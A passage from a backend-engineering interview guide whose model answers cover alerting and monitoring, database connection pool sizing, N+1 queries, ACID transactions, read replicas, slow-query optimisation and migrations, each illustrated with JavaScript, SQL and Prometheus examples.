    span.setAttribute('http.status_code', res.statusCode);
    span.end();
  });
  
  next();
});

// Trace service calls
async function callUserService(userId) {
  const span = tracer.startSpan('call_user_service', {
    parent: req.span,
    attributes: { 'user.id': userId }
  });
  
  try {
    const response = await axios.get(`USER_SERVICE/users/${userId}`, {
      headers: {
        'X-Trace-Id': span.spanContext().traceId
      }
    });
    
    span.setStatus({ code: SpanStatusCode.OK });
    return response.data;
  } catch (error) {
    span.setStatus({
      code: SpanStatusCode.ERROR,
      message: error.message
    });
    throw error;
  } finally {
    span.end();
  }
}
```

**5. Alerting (Get notified of issues)**
```javascript
// Alert rules
const ALERT_RULES = {
  highErrorRate: {
    condition: (errorRate) => errorRate > 0.05,  // 5%
    message: 'Error rate above 5%',
    severity: 'critical'
  },
  
  highLatency: {
    condition: (p95) => p95 > 1000,  // 1 second
    message: 'P95 latency above 1 second',
    severity: 'warning'
  },
  
  circuitBreakerOpen: {
    condition: (status) => status === 'open',
    message: 'Circuit breaker opened',
    severity: 'critical'
  },
  
  lowDiskSpace: {
    condition: (freePercent) => freePercent < 10,
    message: 'Disk space below 10%',
    severity: 'critical'
  }
};

// Check alerts periodically
setInterval(async () => {
  const metrics = await getMetrics();
  
  for (const [name, rule] of Object.entries(ALERT_RULES)) {
    if (rule.condition(metrics[name])) {
      await sendAlert({
        name,
        message: rule.message,
        severity: rule.severity,
        value: metrics[name]
      });
    }
  }
}, 60000);  // Check every minute

// Send alerts
async function sendAlert(alert) {
  // Slack
  await axios.post(SLACK_WEBHOOK_URL, {
    text: `🚨 ${alert.severity.toUpperCase()}: ${alert.message}`,
    attachments: [{
      color: alert.severity === 'critical' ? 'danger' : 'warning',
      fields: [
        { title: 'Alert', value: alert.name },
        { title: 'Value', value: alert.value },
        { title: 'Time', value: new Date().toISOString() }
      ]
    }]
  });
  
  // PagerDuty (for critical)
  if (alert.severity === 'critical') {
    await axios.post(PAGERDUTY_API_URL, {
      event_action: 'trigger',
      payload: {
        summary: alert.message,
        severity: 'error',
        source: 'api-gateway'
      }
    });
  }
  
  // Email
  await sendEmail({
    to: 'ops@company.com',
    subject: `Alert: ${alert.message}`,
    body: JSON.stringify(alert, null, 2)
  });
}
```

**6. Prometheus Alert Rules:**
```yaml
groups:
  - name: api_gateway
    interval: 30s
    rules:
      # High error rate
      - alert: HighErrorRate
        expr: rate(http_requests_total{status=~"5.."}[5m]) > 0.05
        for: 5m
        annotations:
          summary: "High error rate detected"
          description: "Error rate is {{ $value }}"
      
      # High latency
      - alert: HighLatency
        expr: histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m])) > 1
        for: 5m
        annotations:
          summary: "High latency detected"
          description: "P95 latency is {{ $value }}s"
      
      # Circuit breaker open
      - alert: CircuitBreakerOpen
        expr: circuit_breaker_status{status="open"} > 0
        annotations:
          summary: "Circuit breaker opened for {{ $labels.service }}"
```

**7. Dashboards:**
```
Golden Signals Dashboard:
┌─────────────────────────────────┐
│ Requests/sec: 1,250             │
│ Error rate: 0.3%                │
│ P50 latency: 45ms               │
│ P95 latency: 250ms              │
│ P99 latency: 800ms              │
└─────────────────────────────────┘

Service Health:
┌─────────────────────────────────┐
│ User Service: ● Healthy         │
│ Order Service: ⚠ Degraded       │
│ Payment Service: ● Healthy      │
│ Product Service: ● Healthy      │
└─────────────────────────────────┘

Circuit Breakers:
┌─────────────────────────────────┐
│ Order Service: 🔴 OPEN          │
│ Payment Service: 🟢 CLOSED      │
│ User Service: 🟢 CLOSED         │
└─────────────────────────────────┘
```

**Interview tip:** Cover all four pillars (metrics, logs, traces, alerts), show Prometheus + Grafana setup, explain golden signals (latency, traffic, errors, saturation), and mention alert fatigue (only alert on actionable issues)."

---

# CATEGORY 3: Database & Performance (15 Questions)

## Q28: How do you size database connection pools?

**Perfect Answer:**

"Formula: `connections = ((core_count × 2) + effective_spindle_count)`

**Why this formula works:**
```
CPU cores: 4
Disk drives: 1 SSD (effective_spindle_count = 1)

Optimal connections = (4 × 2) + 1 = 9

Reasoning:
- Core × 2: Each core can handle 2 threads (hyperthreading)
- + spindle_count: Disk I/O parallelism
- For SSD: spindle_count = 1 (no physical spinning)
- For HDD: spindle_count = actual drive count
```

**Too small (Bottleneck):**
```javascript
const pool = new Pool({ max: 2 });

// 100 concurrent requests
// Only 2 connections available
// 98 requests wait in queue
// Sequential processing
// Slow!
```

**Too large (Overwhelm database):**
```javascript
const pool = new Pool({ max: 200 });

// Postgres default max_connections = 100
// Other apps need connections too
// Context switching overhead
// Database CPU spikes
// OOM (out of memory)
```

**Production configuration:**
```javascript
const pool = new Pool({
  host: process.env.DB_HOST,
  port: 5432,
  database: process.env.DB_NAME,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  
  // Connection pool
  min: 5,      // Always keep 5 warm
  max: 20,     // Allow burst to 20
  
  // Timeouts
  connectionTimeoutMillis: 2000,   // Wait max 2s for connection
  idleTimeoutMillis: 30000,         // Close idle after 30s
  
  // Health
  keepAlive: true,
  keepAliveInitialDelayMillis: 10000
});
```

**Sizing for multiple services:**
```
Database max_connections: 100

Services:
- API Gateway: 20 connections
- User Service: 20 connections
- Order Service: 20 connections
- Product Service: 20 connections
- Background Jobs: 10 connections
- Total: 90 connections

Reserve 10 for admin/maintenance
```

**Monitoring pool health:**
```javascript
setInterval(() => {
  logger.info('Connection pool stats', {
    total: pool.totalCount,
    idle: pool.idleCount,
    waiting: pool.waitingCount
  });
  
  // Alert if pool exhausted
  if (pool.waitingCount > 10) {
    logger.warn('Connection pool under pressure', {
      waiting: pool.waitingCount,
      idle: pool.idleCount,
      max: pool.options.max
    });
  }
}, 60000);
```

**Interview tip:** Give the formula, explain why it works (CPU cores + disk I/O), discuss the trade-offs (too small = bottleneck, too large = overwhelm DB), and mention monitoring pool utilization."

---

## Q29: What is the N+1 query problem and how do you solve it?

**Perfect Answer:**

"N+1 problem: Making N additional queries in a loop instead of one efficient query.

**The Problem:**
```javascript
// ❌ BAD: N+1 queries
async function getOrders() {
  // 1 query to get all orders
  const orders = await db.query('SELECT * FROM orders');
  
  // N queries (one per order) to get user info
  for (const order of orders.rows) {
    const user = await db.query(
      'SELECT name, email FROM users WHERE id = $1',
      [order.user_id]
    );
    order.user = user.rows[0];
  }
  
  return orders.rows;
}

// 100 orders = 101 queries (1 + 100)
// Each query: ~5ms
// Total: 505ms
```

**Solution 1: JOIN (Best for related data)**
```javascript
// ✅ GOOD: 1 query with JOIN
async function getOrders() {
  const result = await db.query(`
    SELECT 
      orders.*,
      users.name AS user_name,
      users.email AS user_email
    FROM orders
    JOIN users ON orders.user_id = users.id
  `);
  
  return result.rows.map(row => ({
    id: row.id,
    total: row.total,
    status: row.status,
    user: {
      name: row.user_name,
      email: row.user_email
    }
  }));
}

// 1 query
// Total: 10ms (50× faster!)
```

**Solution 2: Batching with IN clause**
```javascript
// ✅ GOOD: 2 queries total
async function getOrders() {
  // Query 1: Get all orders
  const orders = await db.query('SELECT * FROM orders');
  
  // Query 2: Get all users at once
  const userIds = orders.rows.map(o => o.user_id);
  const users = await db.query(
    'SELECT id, name, email FROM users WHERE id = ANY($1)',
    [userIds]
  );
  
  // Build lookup map
  const userMap = {};
  users.rows.forEach(user => {
    userMap[user.id] = user;
  });
  
  // Attach users to orders
  return orders.rows.map(order => ({
    ...order,
    user: userMap[order.user_id]
  }));
}

// 2 queries instead of 101
// Total: 15ms (33× faster!)
```

**Solution 3: DataLoader (For GraphQL/complex scenarios)**
```javascript
const DataLoader = require('dataloader');

// Batch loading function
const userLoader = new DataLoader(async (userIds) => {
  const users = await db.query(
    'SELECT * FROM users WHERE id = ANY($1)',
    [userIds]
  );
  
  // Return in same order as input
  const userMap = {};
  users.rows.forEach(user => {
    userMap[user.id] = user;
  });
  
  return userIds.map(id => userMap[id]);
});

// Usage
async function getOrders() {
  const orders = await db.query('SELECT * FROM orders');
  
  // DataLoader automatically batches requests
  const ordersWithUsers = await Promise.all(
    orders.rows.map(async (order) => ({
      ...order,
      user: await userLoader.load(order.user_id)
    }))
  );
  
  return ordersWithUsers;
}

// DataLoader batches all userLoader.load() calls
// 2 queries total (orders + batched users)
```

**Complex example with multiple relations:**
```javascript
// ❌ BAD: N+1+N problem
async function getOrdersWithDetails() {
  const orders = await db.query('SELECT * FROM orders');  // Query 1
  
  for (const order of orders.rows) {
    // Query N (users)
    const user = await db.query('SELECT * FROM users WHERE id = $1', [order.user_id]);
    order.user = user.rows[0];
    
    // Query N (products)
    const products = await db.query('SELECT * FROM order_items WHERE order_id = $1', [order.id]);
    order.items = products.rows;
  }
  
  return orders.rows;
}
// 100 orders = 201 queries!

// ✅ GOOD: 3 queries with JOINs
async function getOrdersWithDetails() {
  const result = await db.query(`
    SELECT 
      orders.id AS order_id,
      orders.total,
      orders.status,
      users.id AS user_id,
      users.name AS user_name,
      users.email AS user_email,
      order_items.id AS item_id,
      order_items.product_id,
      order_items.quantity,
      order_items.price
    FROM orders
    JOIN users ON orders.user_id = users.id
    LEFT JOIN order_items ON orders.id = order_items.order_id
  `);
  
  // Group by order
  const ordersMap = {};
  
  result.rows.forEach(row => {
    if (!ordersMap[row.order_id]) {
      ordersMap[row.order_id] = {
        id: row.order_id,
        total: row.total,
        status: row.status,
        user: {
          id: row.user_id,
          name: row.user_name,
          email: row.user_email
        },
        items: []
      };
    }
    
    if (row.item_id) {
      ordersMap[row.order_id].items.push({
        id: row.item_id,
        productId: row.product_id,
        quantity: row.quantity,
        price: row.price
      });
    }
  });
  
  return Object.values(ordersMap);
}
// 1 query, 15ms
```

**Detection in code reviews:**
```javascript
// 🚩 Red flag: Query inside loop
for (const item of items) {
  const result = await db.query(...);  // N+1 WARNING!
}

// ✅ Better: Batch query
const ids = items.map(i => i.id);
const results = await db.query('... WHERE id = ANY($1)', [ids]);
```

**Monitoring:**
```javascript
// Log slow queries
const slowQueryThreshold = 100;  // 100ms

pool.on('query', (query) => {
  const start = Date.now();
  
  query.on('end', () => {
    const duration = Date.now() - start;
    
    if (duration > slowQueryThreshold) {
      logger.warn('Slow query detected', {
        duration,
        sql: query.text,
        stack: new Error().stack  // See where query originated
      });
    }
  });
});
```

**Interview tip:** Show the dramatic performance difference (505ms vs 10ms), explain both JOIN and batching solutions, and mention tools like DataLoader for automatic batching."

---

## Q30: Explain database transactions and ACID properties

**Perfect Answer:**

"Transaction groups multiple operations into atomic unit - all succeed or all fail.

**ACID Properties:**

**A - Atomicity (All or nothing)**
```javascript
// ❌ Without transaction
async function transferMoney(fromAccount, toAccount, amount) {
  // Deduct from sender
  await db.query(
    'UPDATE accounts SET balance = balance - $1 WHERE id = $2',
    [amount, fromAccount]
  );
  
  // CRASH HERE! Money deducted but not added ❌
  
  // Add to receiver
  await db.query(
    'UPDATE accounts SET balance = balance + $1 WHERE id = $2',
    [amount, toAccount]
  );
}

// ✅ With transaction (Atomic)
async function transferMoney(fromAccount, toAccount, amount) {
  const client = await pool.connect();
  
  try {
    await client.query('BEGIN');
    
    // Deduct from sender
    await client.query(
      'UPDATE accounts SET balance = balance - $1 WHERE id = $2',
      [amount, fromAccount]
    );
    
    // Add to receiver
    await client.query(
      'UPDATE accounts SET balance = balance + $1 WHERE id = $2',
      [amount, toAccount]
    );
    
    await client.query('COMMIT');  // Both succeed
  } catch (error) {
    await client.query('ROLLBACK');  // Both fail
    throw error;
  } finally {
    client.release();
  }
}
// Either both updates happen or neither happens
```

**C - Consistency (Valid state always)**
```javascript
// Database constraints enforced
CREATE TABLE accounts (
  id SERIAL PRIMARY KEY,
  balance DECIMAL(10, 2) CHECK (balance >= 0),  -- Can't go negative
  CONSTRAINT positive_balance CHECK (balance >= 0)
);

// Transaction maintains constraints
async function transferMoney(fromAccount, toAccount, amount) {
  const client = await pool.connect();
  
  try {
    await client.query('BEGIN');
    
    // Check balance before deducting
    const result = await client.query(
      'SELECT balance FROM accounts WHERE id = $1',
      [fromAccount]
    );
    
    if (result.rows[0].balance < amount) {
      throw new Error('Insufficient funds');
    }
    
    // Deduct
    await client.query(
      'UPDATE accounts SET balance = balance - $1 WHERE id = $2',
      [amount, fromAccount]
    );
    
    // Add
    await client.query(
      'UPDATE accounts SET balance = balance + $1 WHERE id = $2',
      [amount, toAccount]
    );
    
    await client.query('COMMIT');
  } catch (error) {
    await client.query('ROLLBACK');
    throw error;
  } finally {
    client.release();
  }
}
```

**I - Isolation (Transactions don't interfere)**
```javascript
// Isolation levels:

// READ UNCOMMITTED (Lowest isolation, allows dirty reads)
await client.query('SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED');
// Can read uncommitted changes from other transactions
// Problem: Dirty reads (reading data that might be rolled back)

// READ COMMITTED (Default in Postgres)
await client.query('SET TRANSACTION ISOLATION LEVEL READ COMMITTED');
// Only reads committed data
// Problem: Non-repeatable reads (data changes between reads)

// REPEATABLE READ
await client.query('SET TRANSACTION ISOLATION LEVEL REPEATABLE READ');
// Same query returns same results within transaction
// Problem: Phantom reads (new rows appear)

// SERIALIZABLE (Highest isolation)
await client.query('SET TRANSACTION ISOLATION LEVEL SERIALIZABLE');
// Complete isolation, as if transactions ran one at a time
// Problem: Performance overhead

// Example of isolation issue:
// Transaction 1: Transfer $100 from A to B
// Transaction 2: Check total balance of A + B

// Without proper isolation:
// T1: Deduct $100 from A (balance A = $900)
// T2: Read A = $900, Read B = $1000, Total = $1900 ❌ (missing $100!)
// T1: Add $100 to B (balance B = $1100)
// T2 read inconsistent state!

// With REPEATABLE READ:
// T2 sees snapshot from start of transaction
// Total always = $2000 ✅
```

**D - Durability (Committed = permanent)**
```javascript
// Once COMMIT returns, data is safe (even if server crashes)

await client.query('COMMIT');
// Postgres writes to WAL (Write-Ahead Log)
// WAL synced to disk
// Even if crash happens now, transaction persists

// Database recovery:
// 1. Read WAL
// 2. Replay committed transactions
// 3. Rollback uncommitted transactions
```

**Transaction helper function:**
```javascript
async function withTransaction(callback) {
  const client = await pool.connect();
  
  try {
    await client.query('BEGIN');
    const result = await callback(client);
    await client.query('COMMIT');
    return result;
  } catch (error) {
    await client.query('ROLLBACK');
    throw error;
  } finally {
    client.release();
  }
}

// Usage
const result = await withTransaction(async (client) => {
  await client.query('UPDATE accounts SET balance = balance - $1 WHERE id = $2', [100, 1]);
  await client.query('UPDATE accounts SET balance = balance + $1 WHERE id = $2', [100, 2]);
  return { success: true };
});
```

**Savepoints (Partial rollback):**
```javascript
async function complexOperation() {
  const client = await pool.connect();
  
  try {
    await client.query('BEGIN');
    
    // Operation 1
    await client.query('INSERT INTO orders ...');
    
    // Savepoint
    await client.query('SAVEPOINT sp1');
    
    // Operation 2 (might fail)
    try {
      await client.query('INSERT INTO audit_log ...');
    } catch (error) {
      // Rollback to savepoint (Operation 2 undone, Operation 1 kept)
      await client.query('ROLLBACK TO SAVEPOINT sp1');
      logger.warn('Audit log failed, continuing without it');
    }
    
    // Operation 3
    await client.query('UPDATE inventory ...');
    
    await client.query('COMMIT');
  } catch (error) {
    await client.query('ROLLBACK');
    throw error;
  } finally {
    client.release();
  }
}
```

**Deadlock handling:**
```javascript
// Deadlock scenario:
// Transaction 1: Lock row A, then try to lock row B
// Transaction 2: Lock row B, then try to lock row A
// Both wait forever!

async function transferWithRetry(from, to, amount, retries = 3) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      return await withTransaction(async (client) => {
        // Lock in consistent order (prevent deadlock)
        const [id1, id2] = [from, to].sort();
        
        await client.query(
          'SELECT * FROM accounts WHERE id IN ($1, $2) ORDER BY id FOR UPDATE',
          [id1, id2]
        );
        
        await client.query(
          'UPDATE accounts SET balance = balance - $1 WHERE id = $2',
          [amount, from]
        );
        
        await client.query(
          'UPDATE accounts SET balance = balance + $1 WHERE id = $2',
          [amount, to]
        );
        
        return { success: true };
      });
    } catch (error) {
      if (error.code === '40P01' && attempt < retries) {  // Deadlock detected
        logger.warn(`Deadlock detected, retry ${attempt}/${retries}`);
        await sleep(100 * attempt);  // Exponential backoff
        continue;
      }
      throw error;
    }
  }
}
```

**Interview tip:** Explain all 4 ACID properties with examples, show proper transaction usage (BEGIN/COMMIT/ROLLBACK), discuss isolation levels and their trade-offs, and mention deadlock prevention strategies."

---

## Q31: When and how do you use read replicas?

**Perfect Answer:**

"Read replicas scale read traffic by distributing queries across multiple database copies.

**When to use:**
```
Signs you need read replicas:
- Read queries >> write queries (90%+ reads)
- Database CPU > 80% (read-heavy)
- Queries slow during peak hours
- Analytics/reporting impacting production
- Global users (reduce latency with regional replicas)
```

**Architecture:**
```
Primary (Write):
- All writes go here
- Single source of truth

Replicas (Read-only):
- Async replication from primary
- Handle read queries
- Can have multiple replicas

Client → Read query → Load balancer → Replica 1, 2, or 3
Client → Write query → Primary → Replicate to replicas
```

**Implementation:**
```javascript
const { Pool } = require('pg');

// Primary connection (writes)
const primaryPool = new Pool({
  host: process.env.DB_PRIMARY_HOST,
  port: 5432,
  database: 'mydb',
  user: 'dbuser',
  password: process.env.DB_PASSWORD,
  max: 20
});

// Read replica connections
const replicaPools = [
  new Pool({
    host: process.env.DB_REPLICA1_HOST,
    port: 5432,
    database: 'mydb',
    user: 'dbuser',
    password: process.env.DB_PASSWORD,
    max: 50  // More connections for reads
  }),
  new Pool({
    host: process.env.DB_REPLICA2_HOST,
    port: 5432,
    database: 'mydb',
    user: 'dbuser',
    password: process.env.DB_PASSWORD,
    max: 50
  })
];

// Load balancer (round-robin)
let replicaIndex = 0;

function getReplicaPool() {
  const pool = replicaPools[replicaIndex];
  replicaIndex = (replicaIndex + 1) % replicaPools.length;
  return pool;
}

// Database helper
class Database {
  // Write operations → Primary
  async query(sql, params) {
    return primaryPool.query(sql, params);
  }
  
  // Read operations → Replica
  async queryRead(sql, params) {
    return getReplicaPool().query(sql, params);
  }
  
  // Transaction → Primary
  async transaction(callback) {
    const client = await primaryPool.connect();
    try {
      await client.query('BEGIN');
      const result = await callback(client);
      await client.query('COMMIT');
      return result;
    } catch (error) {
      await client.query('ROLLBACK');
      throw error;
    } finally {
      client.release();
    }
  }
}

const db = new Database();

// Usage
async function getUsers() {
  // Read from replica
  return db.queryRead('SELECT * FROM users');
}

async function createUser(data) {
  // Write to primary
  return db.query(
    'INSERT INTO users (name, email) VALUES ($1, $2) RETURNING *',
    [data.name, data.email]
  );
}
```

**Replication lag handling:**
```javascript
// Problem: Replication lag
// User creates post → Write to primary
// User views posts → Read from replica (post not there yet!)

// Solution 1: Read your writes from primary
async function createPost(userId, data) {
  // Write to primary
  const post = await db.query(
    'INSERT INTO posts (user_id, content) VALUES ($1, $2) RETURNING *',
    [userId, data.content]
  );
  
  // Cache post ID to read from primary for next 5 seconds
  await redis.setex(`read_primary:user:${userId}`, 5, '1');
  
  return post.rows[0];
}

async function getUserPosts(userId) {
  const shouldReadFromPrimary = await redis.get(`read_primary:user:${userId}`);
  
  if (shouldReadFromPrimary) {
    // Read from primary (guaranteed consistent)
    return db.query('SELECT * FROM posts WHERE user_id = $1', [userId]);
  }
  
  // Read from replica (eventual consistency OK)
  return db.queryRead('SELECT * FROM posts WHERE user_id = $1', [userId]);
}

// Solution 2: Check replication lag
async function queryReplicaWithLagCheck(sql, params, maxLagMs = 1000) {
  const replica = getReplicaPool();
  
  // Check replication lag
  const lagResult = await replica.query(`
    SELECT EXTRACT(MILLISECONDS FROM (NOW() - pg_last_xact_replay_timestamp())) AS lag_ms
  `);
  
  const lagMs = parseFloat(lagResult.rows[0].lag_ms);
  
  if (lagMs > maxLagMs) {
    // Lag too high, use primary
    logger.warn('Replication lag high, using primary', { lagMs });
    return primaryPool.query(sql, params);
  }
  
  // Lag acceptable, use replica
  return replica.query(sql, params);
}
```

**Query routing based on staleness tolerance:**
```javascript
class SmartDatabase {
  // Critical reads (must be fresh) → Primary
  async queryCritical(sql, params) {
    return primaryPool.query(sql, params);
  }
  
  // Normal reads (can tolerate 1s lag) → Replica
  async queryNormal(sql, params) {
    return getReplicaPool().query(sql, params);
  }
  
  // Analytics (can tolerate 5s lag) → Replica
  async queryAnalytics(sql, params) {
    return getReplicaPool().query(sql, params);
  }
}

// Usage
async function getAccountBalance(userId) {
  // Critical: Must be accurate
  return db.queryCritical(
    'SELECT balance FROM accounts WHERE user_id = $1',
    [userId]
  );
}

async function getUserProfile(userId) {
  // Normal: 1s lag OK
  return db.queryNormal(
    'SELECT * FROM users WHERE id = $1',
    [userId]
  );
}

async function getAnalytics() {
  // Analytics: 5s lag OK
  return db.queryAnalytics('SELECT COUNT(*) FROM orders WHERE created_at > NOW() - INTERVAL \'1 day\'');
}
```

**Monitoring replication lag:**
```javascript
async function checkReplicationHealth() {
  for (const [index, pool] of replicaPools.entries()) {
    try {
      const result = await pool.query(`
        SELECT 
          pg_last_xact_replay_timestamp() AS last_replay,
          NOW() - pg_last_xact_replay_timestamp() AS lag
      `);
      
      const lag = result.rows[0].lag;
      
      logger.info('Replication lag', {
        replica: index,
        lag: lag
      });
      
      // Alert if lag > 5 seconds
      if (parseInterval(lag) > 5000) {
        logger.error('High replication lag detected', {
          replica: index,
          lag
        });
      }
    } catch (error) {
      logger.error('Replica health check failed', {
        replica: index,
        error: error.message
      });
    }
  }
}

// Check every 30 seconds
setInterval(checkReplicationHealth, 30000);
```

**Failover handling:**
```javascript
// If primary fails, promote replica to primary
async function handlePrimaryFailure() {
  logger.error('Primary database down, failing over to replica');
  
  // Promote replica 1 to primary
  // (This is usually handled by database cluster manager like Patroni or RDS)
  
  // Update connection strings
  process.env.DB_PRIMARY_HOST = process.env.DB_REPLICA1_HOST;
  
  // Reconnect pools
  await primaryPool.end();
  primaryPool = new Pool({
    host: process.env.DB_PRIMARY_HOST,
    // ... config
  });
  
  logger.info('Failover complete');
}
```

**Benefits:**
```
Performance:
- Primary: 20 connections (writes only)
- Replica 1: 50 connections (reads)
- Replica 2: 50 connections (reads)
- Total read capacity: 100 connections vs 20

Availability:
- Primary down? Promote replica
- Replica down? Use other replicas

Scaling:
- Add more replicas as read traffic grows
- No downtime to add replicas
```

**Interview tip:** Explain when to use read replicas (read-heavy workloads), show proper routing (writes to primary, reads to replicas), discuss replication lag and how to handle it (read-your-writes pattern), and mention monitoring lag to detect issues."

---

## Q32: How do you optimize slow database queries?

**Perfect Answer:**

"Multi-step approach: Identify, Analyze, Optimize, Verify.

**Step 1: Identify slow queries**
```javascript
// Log queries over threshold
const slowQueryThreshold = 100;  // 100ms

const originalQuery = pool.query.bind(pool);
pool.query = async function(...args) {
  const start = Date.now();
  
  try {
    const result = await originalQuery(...args);
    const duration = Date.now() - start;
    
    if (duration > slowQueryThreshold) {
      logger.warn('Slow query', {
        duration,
        query: args[0],
        params: args[1]
      });
    }
    
    return result;
  } catch (error) {
    throw error;
  }
};
```

**Step 2: Analyze with EXPLAIN**
```sql
-- Check query plan
EXPLAIN ANALYZE
SELECT users.*, orders.total
FROM users
JOIN orders ON users.id = orders.user_id
WHERE users.email = 'john@example.com';

-- Output:
Seq Scan on users  (cost=0.00..1000.00 rows=1 width=100) (actual time=150.234..150.456 rows=1 loops=1)
  Filter: (email = 'john@example.com')
  Rows Removed by Filter: 99999
Planning Time: 0.123 ms
Execution Time: 150.789 ms

-- Problem: Sequential scan (no index!)
-- Solution: Add index on email
```

**Step 3: Add indexes**
```sql
-- Create index
CREATE INDEX idx_users_email ON users(email);

-- Re-run EXPLAIN
EXPLAIN ANALYZE
SELECT users.*, orders.total
FROM users
JOIN orders ON users.id = orders.user_id
WHERE users.email = 'john@example.com';

-- Output:
Index Scan using idx_users_email on users  (cost=0.00..8.27 rows=1 width=100) (actual time=0.045..0.056 rows=1 loops=1)
  Index Cond: (email = 'john@example.com')
Planning Time: 0.098 ms
Execution Time: 0.123 ms

-- 150ms → 0.12ms (1250× faster!)
```

**Common optimizations:**

**1. Missing indexes**
```sql
-- ❌ Slow: Seq scan
SELECT * FROM orders WHERE user_id = 123;

-- ✅ Fast: Index scan
CREATE INDEX idx_orders_user_id ON orders(user_id);

-- Composite index for multiple columns
CREATE INDEX idx_orders_user_status ON orders(user_id, status);

-- Covering index (includes all queried columns)
CREATE INDEX idx_orders_covering ON orders(user_id, status, total, created_at);
```

**2. SELECT * (fetch only needed columns)**
```javascript
// ❌ Slow: Fetches all columns (500 bytes per row)
const users = await db.query('SELECT * FROM users');

// ✅ Fast: Fetches only needed columns (50 bytes per row)
const users = await db.query('SELECT id, name, email FROM users');

// 10× less data transferred
```

**3. N+1 queries (covered in Q29)**
```javascript
// ❌ 101 queries
for (const order of orders) {
  const user = await db.query('SELECT * FROM users WHERE id = $1', [order.user_id]);
}

// ✅ 1 query
const result = await db.query(`
  SELECT orders.*, users.name, users.email
  FROM orders
  JOIN users ON orders.user_id = users.id
`);
```

**4. Inefficient WHERE clauses**
```sql
-- ❌ Can't use index (function on column)
SELECT * FROM users WHERE LOWER(email) = 'john@example.com';

-- ✅ Can use index
SELECT * FROM users WHERE email = 'john@example.com';

-- If need case-insensitive, use functional index:
CREATE INDEX idx_users_email_lower ON users(LOWER(email));


-- ❌ Can't use index (leading wildcard)
SELECT * FROM products WHERE name LIKE '%phone%';

-- ✅ Can use index (no leading wildcard)
SELECT * FROM products WHERE name LIKE 'phone%';

-- For full-text search, use:
CREATE INDEX idx_products_name_fts ON products USING gin(to_tsvector('english', name));
SELECT * FROM products WHERE to_tsvector('english', name) @@ to_tsquery('phone');
```

**5. Large OFFSET (paginate better)**
```sql
-- ❌ Slow: Scans and discards 10000 rows
SELECT * FROM orders ORDER BY created_at DESC LIMIT 20 OFFSET 10000;

-- ✅ Fast: Cursor-based pagination
SELECT * FROM orders 
WHERE created_at < '2024-01-01'  -- Last seen timestamp
ORDER BY created_at DESC 
LIMIT 20;

-- Even better: Keyset pagination
SELECT * FROM orders 
WHERE id < 98765  -- Last seen ID
ORDER BY id DESC 
LIMIT 20;
```

**6. Unused indexes (slow writes)**
```sql
-- Check index usage
SELECT 
  schemaname,
  tablename,
  indexname,
  idx_scan AS index_scans,
  idx_tup_read AS tuples_read,
  idx_tup_fetch AS tuples_fetched
FROM pg_stat_user_indexes
WHERE idx_scan = 0
ORDER BY pg_relation_size(indexrelid) DESC;

-- Drop unused indexes
DROP INDEX idx_never_used;

-- Indexes slow down writes (must update index on INSERT/UPDATE)
```

**7. Suboptimal JOINs**
```sql
-- ❌ Multiple JOINs (slow)
SELECT users.name, posts.title, comments.content
FROM users
JOIN posts ON users.id = posts.user_id
JOIN comments ON posts.id = comments.post_id
WHERE users.id = 123;

-- ✅ JOIN only needed tables
SELECT posts.title, comments.content
FROM posts
JOIN comments ON posts.id = comments.post_id
WHERE posts.user_id = 123;
```

**8. Missing LIMIT (return too much data)**
```javascript
// ❌ Returns all orders (could be millions)
const orders = await db.query('SELECT * FROM orders');

// ✅ Paginate
const orders = await db.query('SELECT * FROM orders ORDER BY created_at DESC LIMIT 100');
```

**9. Connection pooling (covered in Q22)**
```javascript
// ❌ New connection per query (170ms overhead)
// ✅ Connection pool (1ms overhead)
```

**10. Query result caching**
```javascript
async function getPopularProducts() {
  const cacheKey = 'popular_products';
  
  // Check cache
  const cached = await redis.get(cacheKey);
  if (cached) {
    return JSON.parse(cached);
  }
  
  // Query database
  const result = await db.query(`
    SELECT * FROM products
    ORDER BY sales_count DESC
    LIMIT 10
  `);
  
  // Cache for 5 minutes
  await redis.setex(cacheKey, 300, JSON.stringify(result.rows));
  
  return result.rows;
}
```

**Monitoring query performance:**
```javascript
const queryStats = {};

pool.on('query', (query) => {
  const start = Date.now();
  const queryText = query.text;
  
  query.on('end', () => {
    const duration = Date.now() - start;
    
    if (!queryStats[queryText]) {
      queryStats[queryText] = {
        count: 0,
        totalTime: 0,
        avgTime: 0,
        maxTime: 0
      };
    }
    
    const stats = queryStats[queryText];
    stats.count++;
    stats.totalTime += duration;
    stats.avgTime = stats.totalTime / stats.count;
    stats.maxTime = Math.max(stats.maxTime, duration);
  });
});

// Endpoint to view stats
app.get('/debug/query-stats', (req, res) => {
  const sorted = Object.entries(queryStats)
    .sort((a, b) => b[1].totalTime - a[1].totalTime)
    .slice(0, 20);
  
  res.json(sorted);
});
```

**Interview tip:** Show the systematic approach (identify with logging, analyze with EXPLAIN, optimize with indexes/rewrites, verify improvement), give specific examples (seq scan → index scan gives 1000× speedup), and mention monitoring to catch regressions."

---

## Q33: Explain database migrations and version control

**Perfect Answer:**

"Database migrations track schema changes over time, allowing safe rollback and team collaboration.

**Why migrations matter:**
```
Without migrations:
- Manual SQL scripts
- No version tracking
- Can't rollback easily
- Team conflicts (who changed what?)
- Production vs dev schema drift

With migrations:
- Versioned schema changes
- Automatic rollback
- Git-tracked
- Team synchronized
- Reproducible deployments
```

**Migration structure:**
```javascript
// migrations/001_create_users_table.js
module.exports = {
  async up(db) {
    await db.query(`
      CREATE TABLE users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password_hash VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      )
    `);
    
    await db.query(`
      CREATE INDEX idx_users_email ON users(email)
    `);
  },
  
  async down(db) {
    await db.query(`DROP TABLE IF EXISTS users CASCADE`);
  }
};

// migrations/002_add_users_name.js
module.exports = {
  async up(db) {
    await db.query(`
      ALTER TABLE users
      ADD COLUMN first_name VARCHAR(100),
      ADD COLUMN last_name VARCHAR(100)
    `);
  },
  
  async down(db) {
    await db.query(`
      ALTER TABLE users
      DROP COLUMN first_name,
      DROP COLUMN last_name
    `);
  }
};

// migrations/003_create_orders_table.js
module.exports = {
  async up(db) {
    await db.query(`
      CREATE TABLE orders (
        id SERIAL PRIMARY KEY,
        user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
        total DECIMAL(10, 2) NOT NULL,
